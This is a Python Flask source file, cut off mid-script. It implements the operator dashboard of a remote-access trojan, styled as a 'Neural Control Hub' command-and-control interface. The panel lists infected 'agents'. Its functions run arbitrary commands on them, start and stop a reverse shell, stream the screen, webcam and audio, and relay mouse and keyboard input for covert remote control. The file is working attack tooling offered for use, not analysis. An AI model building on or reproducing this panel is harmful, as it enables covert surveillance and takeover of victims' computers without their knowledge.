from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
from collections import defaultdict
import datetime
import time
import queue
import os
import base64
import tempfile
import socket
import threading
import json

app = Flask(__name__)


# --- Web Dashboard HTML ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Control Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-bg: #0a0a0f;
            --secondary-bg: #1a1a2e;
            --tertiary-bg: #16213e;
            --accent-blue: #00d4ff;
            --accent-purple: #6c5ce7;
            --accent-green: #00ff88;
            --accent-red: #ff4757;
            --accent-yellow: #feca57;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --border-color: #2d3748;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .neural-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(108, 92, 231, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.05) 0%, transparent 50%);
            z-index: -1;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
            padding: 30px 0;
        }

        /* Navigation Bar Styles */
        .nav-bar {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 15px;
            padding: 15px 25px;
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .nav-item {
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 12px 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Orbitron', monospace;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .nav-item:hover {
            border-color: var(--accent-blue);
            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);
            transform: translateY(-2px);
        }

        .nav-item.active {
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border-color: var(--accent-blue);
            color: white;
            box-shadow: 0 6px 25px rgba(0, 212, 255, 0.4);
        }

        .nav-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s;
        }

        .nav-item:hover::before {
            left: 100%;
        }

        .header h1 {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
        }

        .header .subtitle {
            font-size: 1.1rem;
            color: var(--text-secondary);
            font-weight: 300;
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        .panel {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }

        .panel:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4);
        }

        .panel-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .panel-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .panel-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            font-weight: 700;
            color: var(--text-primary);
        }

        .agent-grid {
            display: grid;
            gap: 12px;
            max-height: 400px;
            overflow-y: auto;
        }

        .agent-card {
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .agent-card:hover {
            border-color: var(--accent-blue);
            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.2);
        }

        .agent-card.selected {
            border-color: var(--accent-green);
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
        }

        .agent-status {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 10px var(--accent-green);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .agent-id {
            font-family: 'Orbitron', monospace;
            font-weight: 600;
            color: var(--accent-blue);
            margin-bottom: 5px;
        }

        .agent-info {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .control-section {
            display: grid;
            gap: 20px;
        }

        .control-group {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 15px;
            padding: 20px;
        }

        .control-header {
            font-family: 'Orbitron', monospace;
            font-size: 1rem;
            font-weight: 600;
            color: var(--accent-blue);
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .neural-input {
            width: 100%;
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px 16px;
            color: var(--text-primary);
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }

        .neural-input:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
        }

        .neural-input[readonly] {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-secondary);
        }

        .btn {
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-danger {
            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
        }

        .btn-success {
            background: linear-gradient(45deg, var(--accent-green), #2ed573);
        }

        .output-terminal {
            background: #000;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            color: var(--accent-green);
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            position: relative;
            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        .output-terminal::before {
            content: "NEURAL_TERMINAL_v2.1 > ";
            color: var(--accent-blue);
            font-weight: bold;
        }

        .enhanced-terminal {
            background: linear-gradient(135deg, #000 0%, #1a1a2e 100%);
            border: 2px solid var(--accent-blue);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
        }

        /* Voice Control Styles */
        .voice-control-section {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-top: 15px;
        }

        .mic-button {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            position: relative;
            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
        }

        .mic-button:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 25px rgba(255, 71, 87, 0.5);
        }

        .mic-button.active {
            background: linear-gradient(45deg, var(--accent-green), #2ed573);
            box-shadow: 0 6px 25px rgba(0, 255, 136, 0.5);
            animation: pulse-mic 1.5s infinite;
        }

        .mic-button.active::after {
            content: '';
            position: absolute;
            width: 80px;
            height: 80px;
            border: 2px solid var(--accent-green);
            border-radius: 50%;
            animation: mic-ripple 1.5s infinite;
        }

        @keyframes pulse-mic {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        @keyframes mic-ripple {
            0% {
                transform: scale(1);
                opacity: 1;
            }
            100% {
                transform: scale(1.4);
                opacity: 0;
            }
        }

        .voice-status-display {
            flex: 1;
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: var(--text-secondary);
            min-height: 60px;
            display: flex;
            align-items: center;
        }

        .voice-status-display.listening {
            border-color: var(--accent-green);
            color: var(--accent-green);
            background: rgba(0, 255, 136, 0.05);
        }

        /* Tab Content Styles */
        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .section-divider {
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent-blue), transparent);
            margin: 30px 0;
            border-radius: 1px;
        }

        .status-indicator {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-top: 10px;
            display: none;
        }

        .status-success {
            background: rgba(0, 255, 136, 0.2);
            color: var(--accent-green);
            border: 1px solid var(--accent-green);
        }

        .status-error {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .status-pending {
            background: rgba(255, 255, 0, 0.2);
            color: var(--accent-yellow);
            border: 1px solid var(--accent-yellow);
        }

        .no-agents {
            text-align: center;
            padding: 40px 20px;
            color: var(--text-secondary);
        }

        .no-agents-icon {
            font-size: 3rem;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--primary-bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--accent-blue);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-purple);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="neural-bg"></div>
    
    <div class="container">
        <div class="header">
            <h1>NEURAL CONTROL HUB</h1>
            <p class="subtitle">Advanced Command & Control Interface</p>
        </div>

        <!-- Navigation Bar -->
        <div class="nav-bar">
            <div class="nav-item active" onclick="switchTab('commands')" id="nav-commands">
                ⚡ Command Execution
            </div>
            <div class="nav-item" onclick="switchTab('shell')" id="nav-shell">
                🐚 Reverse Shell
            </div>
            <div class="nav-item" onclick="switchTab('voice')" id="nav-voice">
                🎤 Voice Control
            </div>
            <div class="nav-item" onclick="switchTab('remote')" id="nav-remote">
                🖱️ Remote Control
            </div>
        </div>

        <div class="grid">
            <!-- Agents Panel -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-icon">🔗</div>
                    <div class="panel-title">Active Agents</div>
                </div>
                <div class="agent-grid" id="agent-list">
                    <div class="no-agents">
                        <div class="no-agents-icon">🤖</div>
                        <div>No agents connected</div>
                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
                    </div>
                </div>
            </div>

            <!-- Control Panel -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-icon">⚡</div>
                    <div class="panel-title">Control Interface</div>
                </div>
                
                <div class="control-section">
                    <div class="control-group">
                        <div class="control-header">Target Selection</div>
                        <div class="input-group">
                            <label class="input-label">Selected Agent</label>
                            <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent from the left panel">
                        </div>
                    </div>

                    <!-- Command Execution Tab -->
                    <div id="tab-commands" class="tab-content active">
                        <div class="control-group">
                            <div class="control-header">Command Execution</div>
                            <div class="input-group">
                                <label class="input-label">Command</label>
                                <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
                            </div>
                            <button class="btn" onclick="issueCommand()">Execute Command</button>
                            <button class="btn btn-success" onclick="getOutput()">Retrieve Output</button>
                            <div id="command-status" class="status-indicator"></div>
                        </div>

                        <div class="control-group">
                            <div class="control-header">Quick Actions</div>
                            <button class="btn" onclick="listProcesses()">List Processes</button>
                            <button class="btn" onclick="startScreenStream()">Screen Stream</button>
                            <button class="btn" onclick="startCameraStream()">Camera Stream</button>
                            <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                        </div>
                    </div>

                    <!-- Reverse Shell Tab -->
                    <div id="tab-shell" class="tab-content">
                        <div class="control-group">
                            <div class="control-header">Reverse Shell</div>
                            <button class="btn" onclick="startReverseShell()">Start Reverse Shell</button>
                            <button class="btn btn-danger" onclick="stopReverseShell()">Stop Reverse Shell</button>
                            <div class="input-group">
                                <label class="input-label">Shell Command</label>
                                <input type="text" class="neural-input" id="shell-command" placeholder="Enter shell command...">
                            </div>
                            <button class="btn" onclick="executeShellCommand()">Execute Shell Command</button>
                            <div id="shell-status" class="status-indicator"></div>
                        </div>
                    </div>

                    <!-- Voice Control Tab -->
                    <div id="tab-voice" class="tab-content">
                        <div class="control-group">
                            <div class="control-header">Voice Control</div>
                            <button class="btn" onclick="startVoiceControl()">Start Voice Control</button>
                            <button class="btn btn-danger" onclick="stopVoiceControl()">Stop Voice Control</button>
                            <div id="voice-status" class="status-indicator"></div>
                            
                            <div class="section-divider"></div>
                            
                            <div class="control-header">Live Microphone</div>
                            <div class="voice-control-section">
                                <button class="mic-button" id="mic-button" onclick="toggleMicrophone()">
                                    🎤
                                </button>
                                <div class="voice-status-display" id="voice-display">
                                    Click the microphone to start live voice streaming to the agent
                                </div>
                            </div>
                            
                            <div class="voice-commands-info" style="margin-top: 15px;">
                                <small style="color: var(--text-secondary);">
                                    Voice commands: "screenshot", "start camera", "stop camera", "start streaming", "stop streaming", "system info", "list processes", "current directory", "run [command]"
                                </small>
                            </div>
                        </div>
                    </div>

                    <!-- Remote Control Tab -->
                    <div id="tab-remote" class="tab-content">
                        <div class="control-group">
                            <div class="control-header">Remote Control</div>
                            <button class="btn" onclick="startRemoteControl()" id="remote-start-btn">Start Remote Control</button>
                            <button class="btn btn-danger" onclick="stopRemoteControl()" id="remote-stop-btn">Stop Remote Control</button>
                            <div id="remote-status" class="status-indicator"></div>
                            
                            <div class="section-divider"></div>
                            
                            <div class="control-header">Mouse & Keyboard Sync</div>
                            <div class="remote-control-section">
                                <div class="remote-control-area" id="remote-control-area" style="
                                    width: 100%;
                                    height: 300px;
                                    border: 2px solid var(--border-color);
                                    border-radius: 10px;
                                    background: var(--secondary-bg);
                                    display: flex;
                                    align-items: center;
                                    justify-content: center;
                                    cursor: crosshair;
                                    position: relative;
                                    overflow: hidden;
                                ">
                                    <div id="remote-instructions" style="text-align: center; color: var(--text-secondary);">
                                        <div style="font-size: 2rem; margin-bottom: 10px;">🖱️⌨️</div>
                                        <div>Click "Start Remote Control" to begin</div>
                                        <div style="font-size: 0.8rem; margin-top: 5px;">
                                            Mouse movements and keyboard input will be synchronized with the agent
                                        </div>
                                    </div>
                                    <div id="mouse-cursor" style="
                                        position: absolute;
                                        width: 12px;
                                        height: 12px;
                                        background: var(--accent-green);
                                        border-radius: 50%;
                                        pointer-events: none;
                                        display: none;
                                        transform: translate(-50%, -50%);
                                        z-index: 10;
                                    "></div>
                                </div>
                            </div>
                            
                            <div class="control-group" style="margin-top: 15px;">
                                <div class="control-header">Settings</div>
                                <div class="input-group">
                                    <label class="input-label">Mouse Sensitivity</label>
                                    <input type="range" id="mouse-sensitivity" min="0.1" max="3" step="0.1" value="1" style="width: 100%;">
                                    <span id="sensitivity-value" style="color: var(--text-secondary); font-size: 0.8rem;">1.0x</span>
                                </div>
                                <div style="display: flex; gap: 10px; margin-top: 10px;">
                                    <label style="display: flex; align-items: center; gap: 5px; color: var(--text-secondary);">
                                        <input type="checkbox" id="sync-mouse" checked>
                                        Sync Mouse
                                    </label>
                                    <label style="display: flex; align-items: center; gap: 5px; color: var(--text-secondary);">
                                        <input type="checkbox" id="sync-keyboard" checked>
                                        Sync Keyboard
                                    </label>
                                </div>
                            </div>
                            
                            <div class="remote-info" style="margin-top: 15px;">
                                <small style="color: var(--text-secondary);">
                                    Real-time synchronization: Move your mouse over the control area or type on your keyboard to control the remote agent.
                                    The agent will mirror your mouse movements and keyboard inputs in real-time.
                                </small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Output Terminal -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-icon">💻</div>
                <div class="panel-title">Neural Terminal</div>
                <button class="btn" onclick="clearTerminal('output-display')" style="margin-left: auto; padding: 6px 12px; font-size: 0.8rem;">Clear</button>
            </div>
            <div class="output-terminal enhanced-terminal" id="output-display">System ready. Awaiting commands...</div>
        </div>

        <!-- Reverse Shell Terminal -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-icon">🐚</div>
                <div class="panel-title">Reverse Shell Terminal</div>
                <button class="btn" onclick="clearTerminal('shell-output-display')" style="margin-left: auto; padding: 6px 12px; font-size: 0.8rem;">Clear</button>
            </div>
            <div class="output-terminal enhanced-terminal" id="shell-output-display">Reverse shell not connected. Start reverse shell to begin...</div>
        </div>

        <!-- Hidden audio player for streams -->
        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
    </div>

    <script>
        let selectedAgentId = null;
        let outputPollInterval = null;
        let videoWindow = null;
        let cameraWindow = null;
        let audioPlayer = null;
        let microphoneStream = null;
        let microphoneActive = false;
        let audioContext = null;
        let mediaRecorder = null;

        // Navigation Tab Functions
        function switchTab(tabName) {
            // Remove active class from all nav items
            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
            
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            // Activate selected nav item and tab content
            document.getElementById(`nav-${tabName}`).classList.add('active');
            document.getElementById(`tab-${tabName}`).classList.add('active');
        }

        // Clear Terminal Function
        function clearTerminal(terminalId) {
            const terminal = document.getElementById(terminalId);
            if (terminalId === 'output-display') {
                terminal.textContent = 'Terminal cleared. Ready for commands...';
            } else if (terminalId === 'shell-output-display') {
                terminal.textContent = 'Shell terminal cleared. Ready for commands...';
            }
        }

        // Live Microphone Functions
        async function toggleMicrophone() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }

            const micButton = document.getElementById('mic-button');
            const voiceDisplay = document.getElementById('voice-display');

            if (!microphoneActive) {
                try {
                    // Request microphone access
                    microphoneStream = await navigator.mediaDevices.getUserMedia({ 
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true,
                            sampleRate: 44100
                        } 
                    });
                    
                    // Set up audio context and recorder
                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const source = audioContext.createMediaStreamSource(microphoneStream);
                    
                    // Set up MediaRecorder for streaming
                    mediaRecorder = new MediaRecorder(microphoneStream, {
                        mimeType: 'audio/webm;codecs=opus'
                    });
                    
                    let audioChunks = [];
                    
                    mediaRecorder.ondataavailable = async (event) => {
                        if (event.data.size > 0) {
                            audioChunks.push(event.data);
                            
                            // Send audio chunk to agent
                            if (audioChunks.length >= 10) { // Send every 10 chunks (~1 second)
                                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                                await sendAudioToAgent(audioBlob);
                                audioChunks = [];
                            }
                        }
                    };
                    
                    mediaRecorder.start(100); // Collect data every 100ms
                    
                    microphoneActive = true;
                    micButton.classList.add('active');
                    voiceDisplay.classList.add('listening');
                    voiceDisplay.textContent = '🎤 Live microphone active - Agent is hearing you!';
                    
                    showStatus('Live microphone started - Agent can hear you now!', 'success');
                    
                } catch (error) {
                    console.error('Error accessing microphone:', error);
                    showStatus('Error: Could not access microphone. Please check permissions.', 'error');
                    voiceDisplay.textContent = 'Error: Microphone access denied. Please allow microphone permissions.';
                }
            } else {
                // Stop microphone
                stopMicrophone();
            }
        }

        function stopMicrophone() {
            if (microphoneStream) {
                microphoneStream.getTracks().forEach(track => track.stop());
                microphoneStream = null;
            }
            
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
            
            if (audioContext) {
                audioContext.close();
                audioContext = null;
            }
            
            microphoneActive = false;
            const micButton = document.getElementById('mic-button');
            const voiceDisplay = document.getElementById('voice-display');
            
            micButton.classList.remove('active');
            voiceDisplay.classList.remove('listening');
            voiceDisplay.textContent = 'Live microphone stopped. Click to start again.';
            
            showStatus('Live microphone stopped', 'success');
        }

        async function sendAudioToAgent(audioBlob) {
            if (!selectedAgentId) return;
            
            try {
                const formData = new FormData();
                formData.append('audio', audioBlob, 'live_audio.webm');
                formData.append('agent_id', selectedAgentId);
                
                await fetch('/stream_audio', {
                    method: 'POST',
                    body: formData
                });
                
                // Update voice display with activity indicator
                const voiceDisplay = document.getElementById('voice-display');
                voiceDisplay.textContent = '🎤 Live microphone active - Streaming audio to agent... 📡';
                
            } catch (error) {
                console.error('Error sending audio to agent:', error);
            }
        }

        function selectAgent(element, agentId) {
            const oldAgentId = selectedAgentId;

            // Stop any active polling when switching agents
            if (outputPollInterval) {
                clearInterval(outputPollInterval);
                outputPollInterval = null;
            }

            // If there was a previously selected agent, tell it to stop monitoring
            if (oldAgentId && oldAgentId !== agentId) {
                issueCommandInternal(oldAgentId, 'stop-stream');
                issueCommandInternal(oldAgentId, 'stop-audio');
                issueCommandInternal(oldAgentId, 'stop-camera');
                issueCommandInternal(oldAgentId, 'stop-voice-control');
            }

            // Stop microphone if active
            if (microphoneActive) {
                stopMicrophone();
            }

            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
                videoWindow = null;
            }

            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
                cameraWindow = null;
            }

            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
            }

            document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
            element.classList.add('selected');
            
            selectedAgentId = agentId;
            document.getElementById('agent-id').value = agentId;
            document.getElementById('output-display').textContent = 'Agent selected. Ready for commands...';
            document.getElementById('shell-output-display').textContent = 'Reverse shell not connected. Start reverse shell to begin...';
            document.getElementById('command-status').style.display = 'none';
            document.getElementById('shell-status').style.display = 'none';
            document.getElementById('voice-status').style.display = 'none';
            
            // Reset voice display
            const voiceDisplay = document.getElementById('voice-display');
            voiceDisplay.classList.remove('listening');
            voiceDisplay.textContent = 'Click the microphone to start live voice streaming to the agent';
        }

        async function fetchAgents() {
            try {
                const response = await fetch('/agents');
                const agents = await response.json();
                const agentList = document.getElementById('agent-list');
                agentList.innerHTML = '';

                if (Object.keys(agents).length === 0) {
                    agentList.innerHTML = `
                        <div class="no-agents">
                            <div class="no-agents-icon">🤖</div>
                            <div>No agents connected</div>
                            <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
                        </div>
                    `;
                    return;
                }

                for (const agentId in agents) {
                    const agent = agents[agentId];
                    const agentCard = document.createElement('div');
                    agentCard.className = 'agent-card';
                    agentCard.onclick = () => selectAgent(agentCard, agentId);
                    
                    const lastSeen = agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never';
                    agentCard.innerHTML = `
                        <div class="agent-status"></div>
                        <div class="agent-id">${agentId.substring(0, 8)}...</div>
                        <div class="agent-info">Last seen: ${lastSeen}</div>
                    `;
                    
                    if (agentId === selectedAgentId) {
                        agentCard.classList.add('selected');
                    }
                    
                    agentList.appendChild(agentCard);
                }
            } catch (error) {
                console.error('Error fetching agents:', error);
                document.getElementById('agent-list').innerHTML = `
                    <div class="no-agents">
                        <div class="no-agents-icon">⚠️</div>
                        <div>Connection Error</div>
                        <div style="font-size: 0.8rem; margin-top: 5px;">Unable to reach control server</div>
                    </div>
                `;
            }
        }

        async function issueCommand() {
            const command = document.getElementById('command').value;
            const statusDiv = document.getElementById('command-status');

            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }
            if (!command) { 
                showStatus('Please enter a command.', 'error');
                return; 
            }

            // Clear any previous polling interval
            if (outputPollInterval) {
                clearInterval(outputPollInterval);
                outputPollInterval = null;
            }

            document.getElementById('output-display').textContent = 'Executing command... Please wait.';

            try {
                const response = await fetch('/issue_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: selectedAgentId, command: command })
                });
                const result = await response.json();
                
                if (response.ok) {
                    showStatus(`Command executed successfully`, 'success');
                    document.getElementById('command').value = '';

                    // Start polling for the output automatically
                    outputPollInterval = setInterval(getOutput, 3000); // Poll every 3 seconds
                } else {
                    showStatus(`Error: ${result.message}`, 'error');
                }
            } catch (error) {
                showStatus('Network error. Could not issue command.', 'error');
                console.error('Error issuing command:', error);
            }
        }

        async function getOutput() {
            const outputDisplay = document.getElementById('output-display');
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }

            try {
                const response = await fetch(`/get_output/${selectedAgentId}`);
                const result = await response.json();

                if (response.ok) {
                    if (result.output && result.output.length > 0) {
                        outputDisplay.textContent = result.output.join('\\n\\n--- Command Output ---\\n\\n');
                        // Stop polling since we've received the output
                        if (outputPollInterval) {
                            clearInterval(outputPollInterval);
                            outputPollInterval = null;
                        }
                    } else {
                        // If polling is not active, it means this was a manual click with no new output.
                        if (!outputPollInterval) {
                            outputDisplay.textContent = 'No new output from agent.';
                        }
                    }
                } else {
                    outputDisplay.textContent = `Error: ${result.message}`;
                    if (outputPollInterval) {
                        clearInterval(outputPollInterval);
                        outputPollInterval = null;
                    }
                }
            } catch (error) {
                outputDisplay.textContent = 'Network error. Could not retrieve output.';
                console.error('Error getting output:', error);
                if (outputPollInterval) {
                    clearInterval(outputPollInterval);
                    outputPollInterval = null;
                }
            }
        }

        async function startScreenStream() {
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }
            
            // Tell the agent to start both video and audio streams
            await issueCommandInternal(selectedAgentId, 'start-stream'); // Screen stream
            await issueCommandInternal(selectedAgentId, 'start-audio'); // Audio stream

            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
            }

            // Open video stream in a popup
            const videoUrl = `/video_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            const windowName = `LiveStream_${selectedAgentId}`;
            const windowFeatures = 'width=800,height=600,resizable=yes,scrollbars=no,status=no';
            videoWindow = window.open(videoUrl, windowName, windowFeatures);

            // Start playing audio on the main page
            audioPlayer = document.getElementById('audio-player');
            const audioUrl = `/audio_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            audioPlayer.style.display = 'block';
            audioPlayer.src = audioUrl;
            audioPlayer.play();
            
            showStatus('Screen stream started', 'success');
        }

        async function startCameraStream() {
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }

            await issueCommandInternal(selectedAgentId, 'start-camera');

            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
            }

            const cameraUrl = `/camera_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            const windowName = `CameraStream_${selectedAgentId}`;
            const windowFeatures = 'width=640,height=480,resizable=yes,scrollbars=no,status=no';
            cameraWindow = window.open(cameraUrl, windowName, windowFeatures);
            
            showStatus('Camera stream started', 'success');
        }

        async function stopAllStreams() {
            if (selectedAgentId) {
                // Tell the agent to stop both streams
                await issueCommandInternal(selectedAgentId, 'stop-stream');
                await issueCommandInternal(selectedAgentId, 'stop-audio');
                await issueCommandInternal(selectedAgentId, 'stop-camera');
            }
            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
                audioPlayer.style.display = 'none';
            }
            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
                videoWindow = null;
            }
            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
                cameraWindow = null;
            }
            
            showStatus('All streams stopped', 'success');
        }

        function listProcesses() {
            const commandInput = document.getElementById('command');
            // Select Name, Id, and MainWindowTitle for a more informative process list.
            commandInput.value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
            issueCommand();
        }

        // Reverse Shell Functions
        async function startReverseShell() {
            if (selectedAgentId) {
                await issueCommandInternal(selectedAgentId, 'start-reverse-shell');
                showStatus('Reverse shell started', 'success');
                document.getElementById('shell-output-display').textContent = 'Reverse shell connecting...';
            } else {
                showStatus('Please select an agent first.', 'error');
            }
        }

        async function stopReverseShell() {
            if (selectedAgentId) {
                await issueCommandInternal(selectedAgentId, 'stop-reverse-shell');
                showStatus('Reverse shell stopped', 'success');
                document.getElementById('shell-output-display').textContent = 'Reverse shell disconnected.';
            } else {
                showStatus('Please select an agent first.', 'error');
            }
        }

        async function executeShellCommand() {
            const command = document.getElementById('shell-command').value;
            const statusDiv = document.getElementById('shell-status');
            const outputDisplay = document.getElementById('shell-output-display');

            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }

            if (!command) {
                showStatus('Please enter a shell command.', 'error');
                return;
            }

            try {
                statusDiv.style.display = 'block';
